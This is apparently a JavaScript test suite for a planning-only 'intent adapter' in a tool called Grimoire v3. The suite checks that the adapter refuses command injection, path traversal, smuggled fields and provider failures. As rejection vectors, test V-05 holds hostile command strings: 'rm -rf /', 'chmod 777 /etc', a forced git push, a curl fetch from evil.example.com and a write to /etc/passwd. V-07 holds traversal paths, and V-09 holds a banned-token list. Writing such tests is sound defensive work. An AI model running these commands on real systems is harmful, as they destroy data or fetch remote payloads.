// Grimoire v3 — Intent Adapter suite (Phase 1, build-agent directive).
//
// V coverage map (documented in docs/v3/05-acceptance-tests.md, Group V,
// and docs/v3/36-intent-adapter.md):
//   V-01  manifest contract validity — real registry registration
//   V-02  constructor config refusals (no provider / no validator)
//   V-03  valid text intent → contract-valid request → real Planner plan
//   V-04  malformed / incomplete provider output → safe refusal (PR1/R1)
//   V-05  explicit command formulations in prose fields → refusal (C1)
//   V-06  C1 precision — natural prose with separators/tokens stays valid
//   V-07  outside-workspace / absolute / traversal paths → refusal (P1)
//   V-08  determinism — same intent ⇒ byte-identical proposals, frozen
//   V-09  planning unit performs no write, no execution, no network/env
//   V-10  CLI --intent exit codes: success, refusals, usage errors, stdin
//   V-11  bundle path regression — old input/output format byte-compatible
//   V-12  intent envelope refusals (E1): extra fields, shape violations
//   V-13  provider throwing → refusal, never a crash or a silent success
//   V-14  intent path never reaches execution — T2/gated plans are PLANNED,
//         never composed: no composer, no GATE, no agent, no approval
//
// The happy paths wire the REAL Planner and the REAL Report Bus; the
// providers are injectable test doubles by design (the Phase-1 demo
// provider is the CLI default — disclosed, deterministic, no I/O).
import { describe, it } from "node:test";
import assert from "node:assert";
import { readFileSync, statSync } from "node:fs";
import { spawnSync } from "node:child_process";
import path from "node:path";
import { pathToFileURL } from "node:url";
import {
  createIntentAdapter,
  createDemoProvider,
  DEMO_INTENT_PROVIDER,
  INTENT_FIELDS,
  INTENT_RULES,
} from "../modules/intent-adapter/index.mjs";
import { validatePlanRequest, createPlanner } from "../modules/planner/index.mjs";
import { createReportBus } from "../modules/report-bus/index.mjs";
import { createModuleRegistry, MANIFEST_FIELDS } from "../modules/module-registry/index.mjs";
import { createToolBus } from "../modules/tool-bus/src/bus.mjs";
import {
  loadCapabilityDeclarations,
  createDefaultProviders,
} from "../modules/tool-bus/src/capabilities.mjs";
import {
  runIntentPath,
  presentIntentResult,
  intentExitCodeFor,
  presentResult,
} from "../runtime/local-runtime.mjs";

const ROOT = process.cwd();
const ENTRY = path.join(ROOT, "runtime", "local-runtime.mjs");
const MANIFEST = path.join(ROOT, "modules", "intent-adapter", "manifest.yaml");
const FIXTURE_OK = path.join(ROOT, "test", "_fixtures", "intent_valid.json");
const FIXTURE_CMD = path.join(ROOT, "test", "_fixtures", "intent_command_injection.json");
const FIXTURE_PATH = path.join(ROOT, "test", "_fixtures", "intent_path_escape.json");
const BUNDLE_FIXTURE = path.join(ROOT, "test", "_fixtures", "composition_request.json");

const read = (file) => readFileSync(file, "utf8");
const makeAdapter = (provider = DEMO_INTENT_PROVIDER) =>
  createIntentAdapter({ provider, validateRequest: validatePlanRequest });
const makePlanner = () => createPlanner({ reportBus: createReportBus() });

/** Deterministic T1 intent used across cases. */
const intentT1 = (overrides = {}) => ({
  request: "Add input validation to createUser",
  tier: "T1",
  changes: [{ file: "src/api/users.ts", why: "validate email and password in createUser()" }],
  verification: ["node --test test/users.test.mjs"],
  risks: ["existing callers may rely on permissive input"],
  ...overrides,
});

const spawn = (...args) =>
  spawnSync(process.execPath, [ENTRY, ...args], { encoding: "utf8", cwd: ROOT, timeout: 60000 });

describe("Intent adapter contract (V-01 … V-09)", () => {
  it("V-01: manifest is contract-valid and registers with the real registry", () => {
    const text = read(MANIFEST);
    const toolBus = createToolBus({
      declarationText: loadCapabilityDeclarations(),
      providers: createDefaultProviders(),
      root: ROOT,
    });
    const registry = createModuleRegistry({ toolBus });
    const registered = registry.register(text);
    assert.strictEqual(registered.ok, true, JSON.stringify(registered));
    assert.strictEqual(registered.code, "MR_OK");
    assert.deepStrictEqual(registered.violations, []);
    assert.strictEqual(registered.id, "intent-adapter");
    // Exact 03 §2 field set — nothing beyond it.
    const lines = text
      .split("\n")
      .filter((line) => /^[a-z]+:/.test(line))
      .map((line) => line.split(":")[0]);
    assert.deepStrictEqual(lines, [...MANIFEST_FIELDS], "manifest carries exactly the normative field set");
    assert.ok(/phases:\n  - PLAN/.test(text), "hooks the PLAN phase only");
    assert.ok(/tools: \[\]/.test(text), "declares zero tools");
    assert.ok(INTENT_RULES.length > 0 && INTENT_FIELDS.includes("request"));
  });

  it("V-02: construction fails closed without an injected provider or validator", () => {
    assert.throws(
      () => createIntentAdapter({ validateRequest: validatePlanRequest }),
      (error) => error.code === "E_INPUT_INVALID_INTENT_ADAPTER_CONFIG" && error.grimoire.class === "E-INPUT"
    );
    assert.throws(
      () => createIntentAdapter({ provider: DEMO_INTENT_PROVIDER }),
      (error) => error.code === "E_INPUT_INVALID_INTENT_ADAPTER_CONFIG" && error.grimoire.detail === "validateRequest"
    );
    assert.throws(
      () => createIntentAdapter({ provider: { complete: "not-a-function" }, validateRequest: validatePlanRequest }),
      (error) => error.code === "E_INPUT_INVALID_INTENT_ADAPTER_CONFIG"
    );
  });

  it("V-03: valid text intent → contract-valid request → real Planner plan", () => {
    const intent = JSON.parse(read(FIXTURE_OK));
    const adapter = makeAdapter();
    const proposal = adapter.propose(intent);
    assert.strictEqual(proposal.ok, true, JSON.stringify(proposal.error ?? null));
    // The proposal IS the Planner contract request — validator agrees.
    assert.deepStrictEqual(validatePlanRequest(proposal.request), []);
    const result = makePlanner().plan(proposal.request);
    assert.strictEqual(result.ok, true, JSON.stringify(result.error));
    assert.strictEqual(result.code, "COMPLETED");
    assert.strictEqual(result.stage, "COMPLETE");
    assert.strictEqual(result.plan.task, intent.request, "task is the user's text verbatim");
    assert.strictEqual(result.plan.tier, "T1");
    assert.strictEqual(result.plan.changes[0].file, intent.changes[0].file);
    assert.strictEqual(result.plan.review.required, false, "no trigger ⇒ ungated plan");
    assert.ok(result.report !== null && result.report.sha256.length === 64);
    // T0 default: text + exactly one change, no document depth.
    const t0 = adapter.propose({ request: "Fix the docs typo", changes: [{ file: "docs/guide.md", why: "fix typo" }] });
    assert.strictEqual(t0.ok, true);
    assert.strictEqual(t0.request.tier, "T0");
    const planned = makePlanner().plan(t0.request);
    assert.strictEqual(planned.ok, true);
    assert.strictEqual(planned.plan.depth, "one-line");
  });

  it("V-04: malformed or incomplete provider output refuses safely (PR1/R1)", () => {
    const adapter = makeAdapter();
    const cases = [
      ["not JSON at all {", "PR1 provider output is not valid JSON"],
      ["[1, 2, 3]", "PR1 provider output JSON is not a plain object"],
      [42, "PR1 provider output must be a plain object or a JSON object string"],
      [null, "PR1 provider output must be a plain object or a JSON object string"],
      [{ task: "x", tier: "T9", changes: [{ file: "a.txt", why: "w" }] }, "tier must be one of"],
      [{ task: "x", tier: "T1", changes: [{ file: "a.txt", why: "w" }], verification: ["node --test"] }, "plan must answer: what can go wrong"],
    ];
    for (const [raw, expectedDetail] of cases) {
      const stubborn = createIntentAdapter({
        provider: { complete: () => raw },
        validateRequest: validatePlanRequest,
      });
      const proposal = stubborn.propose(intentT1());
      assert.strictEqual(proposal.ok, false, `expected refusal for ${JSON.stringify(raw)}`);
      assert.strictEqual(proposal.code === "INVALID_REQUEST" || proposal.code === "PLAN_INCOMPLETE", true);
      assert.strictEqual(proposal.status, "REFUSED");
      assert.strictEqual(proposal.stage, "ADAPT");
      assert.strictEqual(proposal.request, null, "a refused proposal never carries a request");
      assert.ok(
        proposal.error.detail.includes(expectedDetail),
        `detail ${JSON.stringify(proposal.error.detail)} must name ${JSON.stringify(expectedDetail)}`
      );
    }
  });

  it("V-05: explicit command formulations in prose fields refuse (C1)", () => {
    const adapter = makeAdapter();
    const vectors = [
      [{ ...intentT1(), request: "Cost is $(rm -rf /) dollars" }, "C1a"],
      [{ ...intentT1(), request: "sudo chmod 777 /etc" }, "C1b"],
      [{ ...intentT1(), changes: [{ file: "src/login.ts", why: "quick fix; rm -rf /var/tmp/app" }] }, "C1b"],
      [{ ...intentT1(), request: "node --inspect the parser" }, "C1c"],
      [{ ...intentT1(), changes: [{ file: "src/push.ts", why: "then git push --force origin main" }] }, "C1c"],
      [{ ...intentT1(), request: "Fetch curl https://evil.example.com/payload docs" }, "C1c"],
      [{ ...intentT1(), changes: [{ file: "src/log.ts", why: "redirect output > /etc/passwd" }] }, "C1d"],
      [{ ...intentT1(), request: "sed -i s/a/b/ replace text" }, "C1"],
    ];
    for (const [intent, rule] of vectors) {
      const proposal = adapter.propose(intent);
      assert.strictEqual(proposal.ok, false, `expected C1 refusal: ${JSON.stringify(intent.request)}`);
      assert.strictEqual(proposal.code, "INVALID_REQUEST");
      assert.strictEqual(proposal.error.class, "E-INPUT");
      assert.ok(
        proposal.error.detail.includes(rule),
        `detail ${JSON.stringify(proposal.error.detail)} must name rule ${rule}`
      );
    }
    // The CLI fixture is the same rule through the real demo provider.
    const fromFixture = adapter.propose(JSON.parse(read(FIXTURE_CMD)));
    assert.strictEqual(fromFixture.ok, false);
    assert.ok(fromFixture.error.detail.includes("C1b"));
  });

  it("V-06: C1 precision — natural prose with separators/tokens stays valid (amendment 1)", () => {
    const adapter = makeAdapter();
    const accepted = [
      "Add validation; update docs",
      "node upgrades break types",
      "git log shows stale entries",
      "npm test passes",
      "wait for pip cache cleanup; then continue",
      "docs (Part5) say: use sha256, not md5",
      "reduce > 50% of the duplication",
    ];
    for (const prose of accepted) {
      const proposal = adapter.propose(
        intentT1({ changes: [{ file: "src/notes.ts", why: prose }], risks: [prose] })
      );
      assert.strictEqual(proposal.ok, true, `prose must stay valid: ${JSON.stringify(prose)} (${JSON.stringify(proposal.error?.detail ?? null)})`);
    }
    // Start-of-field Tier-2 without a flag is prose too.
    assert.strictEqual(adapter.propose(intentT1({ request: "git push hooks break CI" })).ok, true);
  });

  it("V-07: outside-workspace / absolute / traversal paths refuse (P1)", () => {
    const adapter = makeAdapter();
    const badPaths = [
      "../outside.md",
      "/etc/passwd",
      "~/secrets.txt",
      "src\\windows.md",
      "dir/../../escape.md",
      "path with space.md",
      "",
    ];
    for (const file of badPaths) {
      const proposal = adapter.propose(intentT1({ changes: [{ file, why: "touch it" }] }));
      assert.strictEqual(proposal.ok, false, `expected P1 refusal for ${JSON.stringify(file)}`);
      assert.strictEqual(proposal.code, "INVALID_REQUEST");
      assert.ok(proposal.error.detail.includes("P1"), proposal.error.detail);
      assert.ok(proposal.error.detail.includes("file"), proposal.error.detail);
    }
    // The CLI fixture exercises the same rule end to end.
    const fromFixture = adapter.propose(JSON.parse(read(FIXTURE_PATH)));
    assert.strictEqual(fromFixture.ok, false);
    assert.ok(fromFixture.error.detail.includes("P1"));
    // And a valid relative path passes the policy layer.
    assert.strictEqual(adapter.propose(intentT1()).ok, true);
  });

  it("V-08: determinism — same intent ⇒ byte-identical frozen proposals", () => {
    const intent = intentT1();
    const first = makeAdapter().propose(intent);
    const second = makeAdapter().propose(intent);
    const third = makeAdapter().propose(intent);
    assert.strictEqual(JSON.stringify(first), JSON.stringify(second));
    assert.strictEqual(JSON.stringify(second), JSON.stringify(third));
    assert.ok(Object.isFrozen(first) && Object.isFrozen(first.request));
    assert.ok(Object.isFrozen(first.request.changes));
    // Refusals are deterministic too.
    const bad = intentT1({ changes: [{ file: "../x.md", why: "w" }] });
    const r1 = makeAdapter().propose(bad);
    const r2 = makeAdapter().propose(bad);
    assert.strictEqual(JSON.stringify(r1), JSON.stringify(r2));
    // Demo provider is pure: repeated assembly is identical, input untouched.
    const provider = createDemoProvider();
    const a = JSON.parse(JSON.stringify(provider.complete(intent)));
    const b = JSON.parse(JSON.stringify(provider.complete(intent)));
    assert.deepStrictEqual(a, b);
    assert.notStrictEqual(a, intent);
    // Full intent path: repeated runs are byte-identical (report included).
    const run1 = presentIntentResult(runIntentPath(intentT1()));
    const run2 = presentIntentResult(runIntentPath(intentT1()));
    assert.strictEqual(run1, run2, "intent path output is byte-identical across runs");
  });

  it("V-09: planning unit performs no write, no execution, no network or env", () => {
    const sources = ["modules/intent-adapter/manifest.yaml", "modules/intent-adapter/index.mjs",
      "modules/intent-adapter/src/adapter.mjs", "modules/intent-adapter/src/providers.mjs"]
      .map((rel) => ({ rel, text: read(path.join(ROOT, rel)) }));
    const banned = [
      "node:fs", "node:child_process", "node:http", "node:net", "node:crypto",
      "writeFile(", "appendFile(", "unlink(", "rename(", "mkdir(", "spawn(", "execFile(",
      "fetch(", "process.env", "process.pid", "Date.now", "Math.random",
      "eval(", "new Function", "globalThis", "localStorage",
    ];
    for (const { rel, text } of sources) {
      for (const token of banned) {
        assert.ok(!text.includes(token), `${rel} must not contain ${JSON.stringify(token)}`);
      }
    }
    // propose() touches no file system: repository porcelain is unchanged
    // across a propose (only this suite's own files exist as changes).
    const before = spawnSync("git", ["status", "--porcelain", "-uall"], { encoding: "utf8", cwd: ROOT });
    const statBefore = statSync(MANIFEST).mtimeMs;
    makeAdapter().propose(intentT1());
    const after = spawnSync("git", ["status", "--porcelain", "-uall"], { encoding: "utf8", cwd: ROOT });
    assert.strictEqual(after.stdout, before.stdout, "propose changes nothing on disk");
    assert.strictEqual(statSync(MANIFEST).mtimeMs, statBefore);
    // The runtime's intent branch constructs only a planner (no registry,
    // no tool bus, no agent, no composer): a spy planner receives exactly
    // the validated request and nothing else runs.
    let planCalls = 0;
    const spyPlanner = { plan(request) { planCalls += 1; return makePlanner().plan(request); } };
    const spied = runIntentPath(intentT1(), { planner: spyPlanner });
    assert.strictEqual(planCalls, 1);
    assert.strictEqual(spied.ok, true);
    assert.deepStrictEqual(Object.keys(spied).sort(),
      ["code", "error", "ok", "plan", "report", "request", "stage", "status"],
      "planner result shape only — no execution fields exist on this path");
  });
});

describe("Intent CLI path (V-10 … V-14)", () => {
  it("V-10: --intent CLI exit codes — success, C1, depth, usage, stdin", () => {
    const ok = spawn("--intent", FIXTURE_OK);
    assert.strictEqual(ok.status, 0, ok.stderr);
    const header = JSON.parse(ok.stdout.slice(0, ok.stdout.indexOf("\n")));
    assert.strictEqual(header.ok, true);
    assert.strictEqual(header.mode, "intent");
    assert.strictEqual(header.code, "COMPLETED");
    assert.strictEqual(header.stage, "COMPLETE");
    assert.match(header.reportSha256, /^[0-9a-f]{64}$/);
    assert.ok(!ok.stdout.includes(ROOT), "no machine paths in deterministic output");

    const refused = spawn("--intent", FIXTURE_CMD);
    assert.strictEqual(refused.status, 2);
    const refusedHeader = JSON.parse(refused.stdout.slice(0, refused.stdout.indexOf("\n")));
    assert.strictEqual(refusedHeader.ok, false);
    assert.strictEqual(refusedHeader.code, "INVALID_REQUEST");
    assert.strictEqual(refusedHeader.stage, "ADAPT");
    assert.strictEqual(refusedHeader.planRequest, null);
    assert.strictEqual(refusedHeader.reportSha256, null);

    const escape = spawn("--intent", FIXTURE_PATH);
    assert.strictEqual(escape.status, 2);

    const incomplete = spawn("--intent", "-");
    // stdin without input = empty string → unreadable input → exit 2.
    assert.strictEqual(incomplete.status, 2);

    const stdin = spawnSync(
      process.execPath,
      [ENTRY, "--intent", "-"],
      { input: JSON.stringify(intentT1()), encoding: "utf8", cwd: ROOT, timeout: 60000 }
    );
    assert.strictEqual(stdin.status, 0, stdin.stderr);
    assert.strictEqual(JSON.parse(stdin.stdout.slice(0, stdin.stdout.indexOf("\n"))).ok, true);

    const mutex = spawn("--intent", "--approval", "grant", FIXTURE_OK);
    assert.strictEqual(mutex.status, 2);
    // usageError writes to stderr — the same convention the bundle path uses.
    assert.ok(mutex.stderr.includes("planning-only"), mutex.stderr);

    const workspaceMutex = spawn("--intent", "--workspace", "/tmp", FIXTURE_OK);
    assert.strictEqual(workspaceMutex.status, 2);

    const twice = spawn("--intent", "--intent", FIXTURE_OK);
    assert.strictEqual(twice.status, 2);

    const missing = spawn("--intent");
    assert.strictEqual(missing.status, 2);
    assert.ok(missing.stderr.includes("missing input"), missing.stderr);
  });

  it("V-11: bundle path is byte-compatible — old inputs keep old behavior", () => {
    const bundle = spawn(BUNDLE_FIXTURE);
    assert.strictEqual(bundle.status, 0, bundle.stderr);
    const firstLine = bundle.stdout.slice(0, bundle.stdout.indexOf("\n"));
    const header = JSON.parse(firstLine);
    assert.strictEqual(header.mode, undefined, "bundle header keeps its original shape (no mode field)");
    assert.strictEqual(header.ok, true);
    assert.strictEqual(header.code, "COMPLETED");
    // presentResult keeps the original bundle header shape for Group S.
    assert.ok(bundle.stdout.includes("Completion Report"));
    // Two runs of the same bundle input stay byte-identical.
    const again = spawn(BUNDLE_FIXTURE);
    assert.strictEqual(again.stdout, bundle.stdout);
  });

  it("V-12: intent envelope refusals (E1) — extras and shape violations", () => {
    const adapter = makeAdapter();
    const bad = [
      [{ request: "x", execute: true }, 'E1 intent field "execute" does not belong to the intent contract'],
      [{ request: "x", approval: "granted" }, 'E1 intent field "approval" does not belong'],
      [null, "E1 intent must be a plain object"],
      ["just a string", "E1 intent must be a plain object"],
      [{ tier: "T1" }, "E1 intent.request must be a non-empty string"],
      [{ request: "  " }, "E1 intent.request must be a non-empty string"],
      [{ request: "line1\nline2" }, "E1 intent.request must be a single-line string"],
    ];
    for (const [intent, expected] of bad) {
      const proposal = adapter.propose(intent);
      assert.strictEqual(proposal.ok, false, JSON.stringify(intent));
      assert.strictEqual(proposal.code, "INVALID_REQUEST");
      assert.strictEqual(proposal.error.class, "E-INPUT");
      assert.ok(proposal.error.detail.includes(expected), `${proposal.error.detail} vs ${expected}`);
    }
    // A provider cannot smuggle execution fields through either: the
    // assembled candidate is checked by the Planner contract (R1).
    const smuggler = createIntentAdapter({
      provider: { complete: () => ({ ...intentT1(), execution: { kind: "hotkey" } }) },
      validateRequest: validatePlanRequest,
    });
    const proposal = smuggler.propose(intentT1());
    assert.strictEqual(proposal.ok, false);
    assert.ok(proposal.error.detail.includes("unexpected request field"));
  });

  it("V-13: a throwing provider refuses — never a crash, never a success", () => {
    const thrower = createIntentAdapter({
      provider: {
        complete() {
          throw new Error("provider unavailable\nwith details");
        },
      },
      validateRequest: validatePlanRequest,
    });
    const proposal = thrower.propose(intentT1());
    assert.strictEqual(proposal.ok, false);
    assert.strictEqual(proposal.code, "INVALID_REQUEST");
    assert.strictEqual(proposal.error.class, "E-INPUT");
    assert.ok(proposal.error.detail.includes("PR1 provider threw"));
    assert.ok(!proposal.error.detail.includes("\n"), "detail stays single-line");
    // Through the full intent path a refusal never reaches the Planner.
    let planCalls = 0;
    const counting = { plan() { planCalls += 1; throw new Error("must not run"); } };
    const result = runIntentPath(intentT1(), {
      provider: { complete() { throw new Error("boom"); } },
      planner: counting,
    });
    assert.strictEqual(planCalls, 0, "refused proposals never reach the Planner");
    assert.strictEqual(result.ok, false);
    assert.strictEqual(result.stage, "ADAPT");
    assert.strictEqual(result.report, null, "no report is fabricated for a refusal");
    assert.strictEqual(intentExitCodeFor(result), 2);
  });

  it("V-14: intent path never reaches execution — gated plans are planned, not run", () => {
    // A T2 + trigger intent produces a plan whose review.required is true.
    const gated = intentT1({
      tier: "T2",
      trigger: "migration",
      changes: [
        { file: "src/api/users.ts", why: "validate email and password" },
        { file: "test/users.test.mjs", why: "cover accepted and rejected inputs" },
      ],
      risks: ["existing callers may rely on permissive input"],
    });
    const result = runIntentPath(gated);
    assert.strictEqual(result.ok, true, JSON.stringify(result.error));
    assert.strictEqual(result.plan.review.required, true, "the GATE condition exists on the plan");
    assert.strictEqual(result.plan.review.trigger, "migration");
    // …but this path composes nothing: planner result keys only — no
    // orchestration, no approval verdict, no execution identity.
    assert.deepStrictEqual(Object.keys(result).sort(),
      ["code", "error", "ok", "plan", "report", "request", "stage", "status"]);
    assert.strictEqual(result.stage, "COMPLETE", "planner lifecycle only — never GATE/ORCHESTRATE");
    // Approval components are not accepted on this path at all: the
    // exported API takes provider/planner only, so there is no slot to
    // inject one, and the CLI rejects --approval with --intent (V-10).
    // An approval-shaped intent field is refused by E1:
    const adapter = makeAdapter();
    const smuggled = adapter.propose(intentT1({ approval: "granted" }));
    assert.strictEqual(smuggled.ok, false);
    assert.ok(smuggled.error.detail.includes("does not belong"));
    // And a granted-looking provider output cannot mint approval: the
    // Planner contract refuses the unexpected field (V-12), so the only
    // way to a GATE decision remains the explicit bundle path.
    const cli = spawn("--intent", FIXTURE_OK);
    assert.strictEqual(cli.status, 0);
    const header = JSON.parse(cli.stdout.slice(0, cli.stdout.indexOf("\n")));
    assert.strictEqual(header.mode, "intent");
    assert.ok(!("approval" in header) && !("execution" in header));
  });
});
